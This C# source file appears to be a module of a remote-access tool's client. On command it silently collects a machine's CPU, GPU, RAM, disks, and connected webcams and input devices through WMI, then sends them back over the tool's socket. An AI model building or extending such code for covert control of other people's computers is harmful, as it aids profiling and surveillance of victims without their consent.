using Client.Connection;
using MessagePackLib.MessagePack;
using System;
using System.Management;
using System.Text;
using System.Threading;

namespace Client.Handle
{
    public class HandleSystemInfo
    {
        public static void OnRequest(MsgPack unpack_msgpack)
        {
            try
            {
                if (unpack_msgpack.ForcePathObject("Packet").AsString != "systemInfo") return;

                string cpu = GetSingleValue("Win32_Processor", "Name");
                string gpu = GetSingleValue("Win32_VideoController", "Name");
                string ram = GetTotalRam();
                string motherboard = GetSingleValue("Win32_BaseBoard", "Product");
                string disks = GetList("Win32_DiskDrive", "Model", "Size");
                string cameras = GetPnPDevicesByKeywords(new[] { "camera", "webcam", "imaging" });
                string mouse = GetPnPDevicesByKeywords(new[] { "mouse" });
                string keyboard = GetPnPDevicesByKeywords(new[] { "keyboard" });
                string headphones = GetPnPDevicesByKeywords(new[] { "headphone", "audio", "headset" });

                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "systemInfo-";
                packet.ForcePathObject("CPU").AsString = cpu;
                packet.ForcePathObject("GPU").AsString = gpu;
                packet.ForcePathObject("RAM").AsString = ram;
                packet.ForcePathObject("Motherboard").AsString = motherboard;
                packet.ForcePathObject("Disks").AsString = disks;
                packet.ForcePathObject("Cameras").AsString = cameras;
                packet.ForcePathObject("Mouse").AsString = mouse;
                packet.ForcePathObject("Keyboard").AsString = keyboard;
                packet.ForcePathObject("Headphones").AsString = headphones;

                // send using your existing send method - adapt to your client send API
                // Example (if you have a ClientSocket.Send method that accepts bytes):
                ThreadPool.QueueUserWorkItem(state => ClientSocket.Send((byte[])state), packet.Encode2Bytes());
            }
            catch { }
        }

        private static string GetSingleValue(string wmiClass, string property)
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT {property} FROM {wmiClass}"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        var val = mo[property];
                        if (val != null) return val.ToString();
                    }
                }
            }
            catch { }
            return "N/A";
        }

        private static string GetList(string wmiClass, string property, string sizeProperty = null)
        {
            try
            {
                var sb = new StringBuilder();
                using (var searcher = new ManagementObjectSearcher($"SELECT {property}{(string.IsNullOrEmpty(sizeProperty) ? "" : "," + sizeProperty)} FROM {wmiClass}"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        if (sb.Length > 0) sb.Append("\n");;
                        string val = mo[property]?.ToString() ?? "N/A";
                        if (!string.IsNullOrEmpty(sizeProperty))
                        {
                            string sizeRaw = mo[sizeProperty]?.ToString();
                            if (!string.IsNullOrEmpty(sizeRaw) && long.TryParse(sizeRaw, out long s))
                                val += $" ({FormatBytes(s)})";
                        }
                        sb.Append(val);
                    }
                }
                return sb.Length == 0 ? "N/A" : sb.ToString();
            }
            catch { return "N/A"; }
        }

        private static string GetTotalRam()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        var v = mo["TotalPhysicalMemory"];
                        if (v != null && long.TryParse(v.ToString(), out long bytes))
                            return FormatBytes(bytes);
                    }
                }
            }
            catch { }
            return "N/A";
        }

        private static string GetPnPDevicesByKeywords(string[] keywords)
        {
            try
            {
                var sb = new StringBuilder();
                using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_PnPEntity"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        var name = mo["Name"]?.ToString() ?? "";
                        var lower = name.ToLowerInvariant();
                        foreach (var kw in keywords)
                        {
                            if (lower.Contains(kw))
                            {
                                if (sb.Length > 0) sb.Append("\n");;
                                sb.Append(name);
                                break;
                            }
                        }
                    }
                }
                return sb.Length == 0 ? "N/A" : sb.ToString();
            }
            catch { return "N/A"; }
        }

        private static string FormatBytes(long bytes)
        {
            string[] suf = { "B", "KB", "MB", "GB", "TB" };
            int i = 0;
            double dblS = bytes;
            while (dblS >= 1024 && i < suf.Length - 1) { dblS /= 1024; i++; }
            return $"{dblS:0.##} {suf[i]}";
        }
    }
}